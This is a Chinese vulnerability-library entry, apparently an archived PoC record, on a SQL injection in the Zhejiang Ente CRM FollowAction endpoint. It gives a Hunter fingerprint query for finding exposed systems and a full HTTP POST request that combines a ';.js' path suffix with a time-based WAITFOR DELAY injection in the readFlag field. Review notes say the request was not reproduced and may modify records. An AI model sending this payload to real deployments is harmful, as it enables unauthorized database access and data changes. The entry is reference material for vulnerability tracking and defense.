---
source: "wy876 漏洞文库"
title: "浙大恩特CRM FollowAction updreadFlg readFlag SQL 注入"
product: "浙大恩特CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: ";.js后缀鉴权前提未述"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zm2llrx2u25ytzk3"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRMFollowAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"浙大恩特 CRM\""
id: "vw-09b62e7895ab5a20a5920063"
entity_id: "ve-09b62e7895ab5a20a5920063"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 浙大恩特CRM FollowAction updreadFlg readFlag SQL 注入

> 指纹历史字段校订（2026-10-04）：现有完整平台查询保持原值；旧未核字段中的残片逐字迁入 `previous_*`。此迁移不代表已确定原文其他谓词的组合意图，未给出的 AND/OR 不猜补。后文残片字段的旧诊断描述校订前状态，查询仍不证明资产受影响。

## 条目说明

- 对象与具体问题：浙大恩特CRM；FollowAction updreadFlg readFlag SQLi
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：;.js后缀鉴权前提未述
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- updreadFlg为更新状态操作，trk_id=a与readFlag注入可能写业务记录，应提示
- 只有3秒载荷无对照/返回，外部yaml未提供正文
- 公司介绍/版本同模板需核，补修复和路由绕过独立证据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM FollowAction存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。

## 二、影响版本
+ 浙大恩特CRM

## 三、资产测绘
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


## 四、漏洞复现
```http
POST /entsoft/FollowAction.entphone;.js HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Content-Length: 72
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:3%27--
```

> 请求长度说明：原资料 Content-Length 为 72；保留原始标头；其数值未据实际请求体重新计算或验证。


[浙大恩特客户资源管理系统-followaction-entphone--sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145263-d49b26ed-4e41-4352-b174-82a892d4332e.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zm2llrx2u25ytzk3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
